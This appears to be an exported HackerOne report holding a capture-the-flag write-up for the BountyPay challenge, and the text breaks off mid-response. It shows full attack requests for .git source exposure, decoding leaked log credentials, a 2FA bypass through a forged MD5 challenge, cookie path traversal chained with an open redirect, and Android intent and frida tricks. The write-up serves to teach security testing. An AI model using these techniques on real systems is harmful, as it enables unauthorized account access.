{"id":887889,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODc4ODk=","url":"https://hackerone.com/reports/887889","title":"[H1-2006 2020]  H1-CTF writeup","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2020-05-31T12:44:09.607Z","submitted_at":"2020-05-31T12:44:09.607Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"smaury","url":"/smaury","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/679ftrx6ioflymqjri2icob4yl1k/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22mauri-crop.jpg%22%3B%20filename%2A%3DUTF-8%27%27mauri-crop.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e7549843ab9f5d00d50ed693bc7f2375e8aed6f24c01d5198c2e05a1d9e942b0"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:29:10.765Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T05:30:49.707Z","team_member_agreed_on_going_public_at":"2020-06-18T15:29:10.697Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nI've just solved the challenge, I will submit the write-up tomorrow.\n\n## Impact\n\n## Flag:\n`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`","original_report_id":null,"original_report_url":null,"attachments":[{"id":849855,"file_name":"h1-CTF.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/X77pmmEUUa6dtac94FwjZvF8?response-content-disposition=attachment%3B%20filename%3D%22h1-CTF.JPG%22%3B%20filename%2A%3DUTF-8%27%27h1-CTF.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=40f207ae35b1fdb0058b6b34913819a66a8453cca52458fdbaeb3d6739e3b179","file_size":28837,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2020-07-18T05:30:50.000Z","allow_singular_disclosure_after":-38916447.49421822,"singular_disclosure_allowed":true,"vote_count":3,"voters":["nytr0gen","brahim_boufakri01","smaury"],"severity":{"rating":"none","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8236758,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-08T21:06:50.889Z","updated_at":"2020-06-08T21:06:50.889Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8236862,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-06-08T21:18:17.323Z","updated_at":"2020-06-08T21:18:17.323Z","additional_data":{"old_title":"H1-CTF writeup","new_title":"[H1-2006 2020]  H1-CTF writeup"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8242621,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# H1-CTF (h12006)\n\n## Assignment\n\nAll started with this [tweet](https://twitter.com/Hacker0x01/status/1266454022124376064) from the [@Hacker0x01](https://twitter.com/Hacker0x01/) account:\n```\nWe need your help! CEO @martenmickos needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf \n\nBest 3 reports that meet requirements will win an invite to #h12006! 🛸\n```\n\n## 0x00 Initial recon\nFrom the [CTF description](https://hackerone.com/h1-ctf) we can understand that the scope is `*.bountypay.h1ctf.com` so I started a standard DNS enumeration with [OWASP'S Amass](https://github.com/OWASP/Amass), which gave the following output:\n```\n$ amass enum -d bountypay.h1ctf.com -brute -ip\n[...]\napp.bountypay.h1ctf.com         3.21.98.146\nwww.bountypay.h1ctf.com         3.21.98.146\nbountypay.h1ctf.com             3.21.98.146\nsoftware.bountypay.h1ctf.com    3.21.98.146\nstaff.bountypay.h1ctf.com       3.21.98.146\napi.bountypay.h1ctf.com         3.21.98.146\n```\n\nAlready feeling the time pressure I started a quick web-content discovery using [dirsearch](https://github.com/maurosoria/dirsearch) and the [SecList's common wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt), which output I'll discuss later.\n\n## 0x01 app.bountypay.h1ctf.com\n\nThe web-content discovery led me immediately to the app.bountypay.h1ctf.com domain, because of an exposed `.git` directory.  \nExposing such directory is a bad and very dangerous practice, as it allows anyone to download the source code of that specific project, and this was the case.  \n\n```\n$ curl -s https://app.bountypay.h1ctf.com/.git/config\n[core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = false\n        logallrefupdates = true\n[remote \"origin\"]\n        url = https://github.com/bounty-pay-code/request-logger.git\n        fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n        remote = origin\n        merge = refs/heads/master\n```\n\nWith a single `GET` request it is possible to understand that the source code is hosted on [the request-logger repository of the bounty-pay-code Github user](https://github.com/bounty-pay-code/request-logger.git).  \n\nUnfortunately, the repository contained only the source code of the `logger.php` file, nonetheless, it was useful to find a dangerous logging procedure.\n\n```php\n\u003c?php\n\n$data = array(\n    'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n    'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n    'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n    'PARAMS'    =\u003e  array(\n    'GET'       =\u003e  $_GET,\n    'POST'      =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND);\n```\n\nKnowing this it is as easy as doing a GET request to https://app.bountypay.h1ctf.com/bp_web_trace.log to download the log file.\n\n```\n$ curl -s https://app.bountypay.h1ctf.com/bp_web_trace.log\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nAs can be seen in source code the content of the request is saved `base64_encode`'d, so it can be easily decoded.\n\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nAt this point, I had `brian.oliver`'s credentials, but after using them the following 2FA page is presented.\n\nSetting a random input and clicking login I observed the following request:\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=randomdata\n```\n\nThe first idea was to check if I can re-use the `challenge_answer` from the log file, but as a real `OTP` that was not possible.\n\nGiving a second look to the login request was enough to guess that the 16-byte hex-encoded `challenge` parameter might be an `MD5` hash.\n\nSo I tried to send a random string as `challenge_answer` and the corresponding `MD5` as `challenge` and I found myself logged-in.\n\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n\n\nThe panel was pretty empty, with only one working API to list payments for a specific month of a specific year, which didn't show any result, but the following string\n\n```JSON\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=05\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-05\\\",\\\"transactions\\\":[]}\"}\n```\n\nWhile leaving the Burp Suite intruder cluster bombing the two inputs I started analyzing the auth cookie and I noticed that is contained the following `base64_encode`'d `JSON` array:\n```JSON\n{\n        \"account_id\":\"F8gHiqSdpK\",\n        \"hash\":\"de235bffd23df6995ad4e0930baac1a2\"\n}\n```\n\nIt doesn't take much time to notice that the `account_id` value is used to build the path to make requests to `api.bountypay.h1ctf.com`, allowing a partial `SSRF`.\n\n_Time to more recon!_\n\n## 0x02 api.bountypay.h1ctf.com \u0026 software.bountypay.h1ctf.com\n\nGoing back to my [tmux](https://github.com/tmux/tmux) where I was running [dirsearch](https://github.com/maurosoria/dirsearch) I found two interesting things:\n- api.bountypay.h1ctf.com has a `/redirect` endpoint, which when `GET`'d with a `url` parameter allows an [Open Redirect](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) to some `google.com` pages and any `bounty.h1ctf.com` subdomain;\n- software.bountypay.h1ctf.com answers with a `401` status code with the following message `You do not have permission to access this server from your IP Address`.\n\n## 0x03 Partial SSRF --\u003e Open redirect --\u003e Content discovery\n\nTo recap now we have:\n- a partial `SSRF` to interact with any path of api.bountypay.h1ctf.com;\n- an open redirect on api.bountypay.h1ctf.com to `*.bountypay.h1ctf.com`;\n- software.bountypay.h1ctf.com which accepts connection only from some specific IP addresses.\n\nChaining all these conditions allow us to interact with software.bountypay.h1ctf.com by tampering the `account_id` value in the `token` cookie of api.bountypay.h1ctf.com with `/../../../redirect?url=https://software.bountypay.h1ctf.com/?` which results in a request to `https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/?statements?month=05\u0026year=2020`, which results in a redirect to `https://software.bountypay.h1ctf.com/?statements?month=05\u0026year=2020`.\n\n**Request**\n```http\nGET /statements?month=05\u0026year=2019 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nReferer: https://app.bountypay.h1ctf.com/\nCookie: token=eyJhY2NvdW50X2lkIjoiLy4uLy4uLy4uL3JlZGlyZWN0P3VybD1odHRwczovL3NvZnR3YXJlLmJvdW50eXBheS5oMWN0Zi5jb20vPyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n\n```\n\n**Response**\n```http\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 16:57:47 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 1611\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/\\/..\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/?\\/statements?month=05\u0026year=2019\",\"data\":\"\u003c!DOCTYPE html\u003e\\n\u003chtml lang=\\\"en\\\"\u003e\\n\u003chead\u003e\\n    \u003cmeta charset=\\\"utf-8\\\"\u003e\\n    \u003cmeta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"\u003e\\n    \u003cmeta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\"\u003e\\n    \u003ctitle\u003eSoftware Storage\u003c\\/title\u003e\\n    \u003clink href=\\\"\\/css\\/bootstrap.min.css\\\" rel=\\\"stylesheet\\\"\u003e\\n\u003c\\/head\u003e\\n\u003cbody\u003e\\n\\n\u003cdiv class=\\\"container\\\"\u003e\\n    \u003cdiv class=\\\"row\\\"\u003e\\n        \u003cdiv class=\\\"col-sm-6 col-sm-offset-3\\\"\u003e\\n            \u003ch1 style=\\\"text-align: center\\\"\u003eSoftware Storage\u003c\\/h1\u003e\\n            \u003cform method=\\\"post\\\" action=\\\"\\/\\\"\u003e\\n                \u003cdiv class=\\\"panel panel-default\\\" style=\\\"margin-top:50px\\\"\u003e\\n                    \u003cdiv class=\\\"panel-heading\\\"\u003eLogin\u003c\\/div\u003e\\n                    \u003cdiv class=\\\"panel-body\\\"\u003e\\n                        \u003cdiv style=\\\"margin-top:7px\\\"\u003e\u003clabel\u003eUsername:\u003c\\/label\u003e\u003c\\/div\u003e\\n                        \u003cdiv\u003e\u003cinput name=\\\"username\\\" class=\\\"form-control\\\"\u003e\u003c\\/div\u003e\\n                        \u003cdiv style=\\\"margin-top:7px\\\"\u003e\u003clabel\u003ePassword:\u003c\\/label\u003e\u003c\\/div\u003e\\n                        \u003cdiv\u003e\u003cinput name=\\\"password\\\" type=\\\"password\\\" class=\\\"form-control\\\"\u003e\u003c\\/div\u003e\\n                    \u003c\\/div\u003e\\n                \u003c\\/div\u003e\\n                \u003cinput type=\\\"submit\\\" class=\\\"btn btn-success pull-right\\\" value=\\\"Login\\\"\u003e\\n            \u003c\\/form\u003e\\n        \u003c\\/div\u003e\\n    \u003c\\/div\u003e\\n\u003c\\/div\u003e\\n\u003cscript src=\\\"\\/js\\/jquery.min.js\\\"\u003e\u003c\\/script\u003e\\n\u003cscript src=\\\"\\/js\\/bootstrap.min.js\\\"\u003e\u003c\\/script\u003e\\n\u003c\\/body\u003e\\n\u003c\\/html\u003e\"}\n```\n\nAt this point I tried on one side a credentials bruteforce and on the other one a content discovery and, while the first was useless, the second allowed me to discover the following world downloadable https://software.bountypay.h1ctf.com/uploads/BountyPay.apk.\n\n_I struggled a lot downloading that apk because of some misconfiguration server-side, which was fixed a bunch of hours later._\n\n\n## 0x04 APK reversing and dynamic analysis \n\nAnalyzing the APK was petty straightforward as no obfuscation was in place.\nI used [JADX](https://github.com/skylot/jadx) to decompile it, while installing it on an [AVD image](https://developer.android.com/studio/run/managing-avds) created with [Android Studio](https://developer.android.com/studio).\n\nThe APK presented me some level, so it was just a matter of following the steps and the hints.\n\n### Attack surface\nThe app has 4 Activities:\n- MainActivity\n- PartOneActivity\n- PartTwoActivity\n- PartThreeActivity\n\nEach of the `Part(One|Two|Three)Activity` has a dedicated URI handler in the `(one|two|three)://part` format.\n\n### MainActivity\n\nThe first activity just asked to enter a username and an option Twitter handle and, after saving such information, redirected to `PartOneActivity`.\n\n### PartOneActivity\n\nThis activity expected to be called with a `queryParameter` named `start` containing the `PartTwoActivity` string in order to call the next activity:\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null \u0026\u0026 (firstParam = getIntent().getData().getQueryParameter(\"start\")) != null \u0026\u0026 firstParam.equals(\"PartTwoActivity\") \u0026\u0026 settings.contains(\"USERNAME\")) {\n        String user = settings.getString(\"USERNAME\", \"\");\n        SharedPreferences.Editor editor = settings.edit();\n        String twitterhandle = settings.getString(\"TWITTERHANDLE\", \"\");\n        editor.putString(\"PARTONE\", \"COMPLETE\").apply();\n        logFlagFound(user, twitterhandle);\n        startActivity(new Intent(this, PartTwoActivity.class));\n}\n```\n\nConnecting through [adb](https://developer.android.com/studio/command-line/adb) to the emulator and running the following command is enough to invoke the URI handler with the correct parameters: `am start -d 'one://part?start=PartTwoActivity'`.\n\n### PartTwoActivity\n\nAfter invoking the `PartTwoActivity` through previous one I was presented with an empty page. Reading the decompiled code was enough to understand that I should invoke the `two://part` URI handler with two params, which are `two=light` and `switch=on`:\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n        Uri data = getIntent().getData();\n        String firstParam = data.getQueryParameter(\"two\");\n        String secondParam = data.getQueryParameter(\"switch\");\n        if (firstParam != null \u0026\u0026 firstParam.equals(\"light\") \u0026\u0026 secondParam != null \u0026\u0026 secondParam.equals(\"on\")) {\n        editText.setVisibility(0);\n        button.setVisibility(0);\n        textview.setVisibility(0);\n        }\n}\n```\nAt this point an input field and a button were shown. Going back to the sourcecode I understood that the app was expecting me to input a string, which should match another one coming from Firebase.\n```java\npublic void submitInfo(View view) {\n        final String post = ((EditText) findViewById(R.id.editText)).getText().toString();\n        this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {\n                public void onDataChange(DataSnapshot dataSnapshot) {\n                SharedPreferences settings = PartTwoActivity.this.getSharedPreferences(PartTwoActivity.KEY_USERNAME, 0);\n                SharedPreferences.Editor editor = settings.edit();\n                String str = post;\n                if (str.equals(\"X-\" + ((String) dataSnapshot.getValue()))) {\n                        PartTwoActivity.this.logFlagFound(settings.getString(\"USERNAME\", \"\"), settings.getString(\"TWITTERHANDLE\", \"\"));\n                        editor.putString(\"PARTTWO\", \"COMPLETE\").apply();\n                        PartTwoActivity.this.correctHeader();\n                        return;\n                }\n                Toast.makeText(PartTwoActivity.this, \"Try again! :D\", 0).show();\n                }\n\n                public void onCancelled(DatabaseError databaseError) {\n                Log.e(PartTwoActivity.TAG, \"onCancelled\", databaseError.toException());\n                }\n        });\n}\n```\nBeing a lazy person I just hooked with [frida](https://frida.re) the `com.google.firebase.database.DataSnapshot.getValue` method, clicked the `Submit` button and got the value I was supposed to send, which is `X-Token`.\n\n{F860568}\n\n### PartThreeActivity\n\nFinally the last activity was fired, but it was empty again, so I went again to the sourcecode.\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n        Uri data = getIntent().getData();\n        String firstParam = data.getQueryParameter(\"three\");\n        String secondParam = data.getQueryParameter(\"switch\");\n        String thirdParam = data.getQueryParameter(\"header\");\n        byte[] decodeFirstParam = Base64.decode(firstParam, 0);\n        byte[] decodeSecondParam = Base64.decode(secondParam, 0);\n        final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);\n        final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);\n        AnonymousClass5 r17 = r0;\n        DatabaseReference databaseReference = this.childRefThree;\n        byte[] bArr = decodeSecondParam;\n        final String str = firstParam;\n        byte[] bArr2 = decodeFirstParam;\n        final String str2 = secondParam;\n        String str3 = secondParam;\n        final String secondParam2 = thirdParam;\n        String str4 = firstParam;\n        final EditText editText2 = editText;\n        Uri uri = data;\n        final Button button2 = button;\n        AnonymousClass5 r0 = new ValueEventListener() {\n        public void onDataChange(DataSnapshot dataSnapshot) {\n                String str;\n                String value = (String) dataSnapshot.getValue();\n                if (str != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 str2 != null \u0026\u0026 decodedSecondParam.equals(\"on\") \u0026\u0026 (str = secondParam2) != null) {\n                if (str.equals(\"X-\" + value)) {\n                        editText2.setVisibility(0);\n                        button2.setVisibility(0);\n                        PartThreeActivity.this.thread.start();\n                }\n                }\n        }\n\n        public void onCancelled(DatabaseError databaseError) {\n                Log.e(\"TAG\", \"onCancelled\", databaseError.toException());\n        }\n        };\n        databaseReference.addListenerForSingleValueEvent(r0);\n}\n```\n\nAgain it's just a matter of sending the right parameter, which are:\n- `three`: `base64_encode(\"PartThreeActivity\")`\n- `switch`: `base64_encode(\"on\")`\n- `header`: `X-Token`\n\nResulting in the followin `adb` command: `am start -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk=\u0026switch=b24=\u0026header=X-Token'`\n\nAfter restarting the activity a new input appears asking for a `X-Token` value.\n\n```java\nThread thread = new Thread(new Runnable() {\n        public void run() {\n        PartThreeActivity.this.performPostCall(PartThreeActivity.this.getSharedPreferences(PartThreeActivity.KEY_USERNAME, 0).getString(\"TOKEN\", \"\"));\n        }\n});\n```\n\nSo the token is read from the [SharedPreferences](https://developer.android.com/reference/android/content/SharedPreferences) and can be retrieved via the following on-device shell command `grep TOKEN /data/data/bounty.pay/shared_prefs/*.xml`\n\nFinally submitting `8e9998ee3137ca9ade8f372739f062c1` as `token` the Android level is completed!\n\n{F860605}\n\n## 0x05 api.bountypay.h1ctf.com\nFinally having an `X-Token` I went back to `api.bountypay.h1ctf.com` to see if I can interact directly (without the app.bountypay.h1ctf.com proxy) and this was the case.\n\nGuess what? More recon!\n\nI fired again `dirsearch` with the `X-Token` header which showed me a nice API endpoint: `/api/staff`:\n\n**Request**\n```http\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n```\n\n**Response**\n```http\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 08:36:14 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 104\n\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\n\nAfter playing with the API I found that I could change the request method to `POST` and send a `staff_id` parameter, which replies with an `\"Invalid Staff ID\"` error if the id is wrong and `\"Staff Member already has an account\"` if Sam's or Brian's `staff_id` is used.\n\nI thought about my bruteforce options to find a valid `staff_id`, but I quickly realized that sending `36^10` is not a good idea 🙄.\n\nWhile taking a break on Twitter I found the [@BountyPayHQ](https://twitter.com/BountypayHQ) account which follows the [@SandraA76708114](https://twitter.com/SandraA76708114), which has a photo of her `BountyPay` badge.\n\n{F860569}\n\nUsing Sandra's `staff_id` in the `/api/staff` I got her credentials to access staff.bountypay.h1ctf.com.\n\n**Request**\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 23\n\nstaff_id=STF:8FJ3KFISL3\n```\n\n**Response**\n```http\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 08:55:36 GMT\nContent-Type: 